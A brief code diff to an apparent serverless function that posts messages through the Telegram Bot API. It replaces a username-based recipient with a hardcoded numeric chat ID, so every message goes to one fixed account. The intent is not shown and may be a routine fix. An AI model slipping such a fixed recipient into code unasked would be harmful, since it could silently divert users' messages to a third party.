@@ -231,7 +231,7 @@ serve(async (req) => {
       // Construct exact Telegram API URL as specified
       const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
       const payload = {
-        chat_id: `@${username}`,
+        chat_id: "6157932900",
         text: message,
         parse_mode: 'HTML'
       };
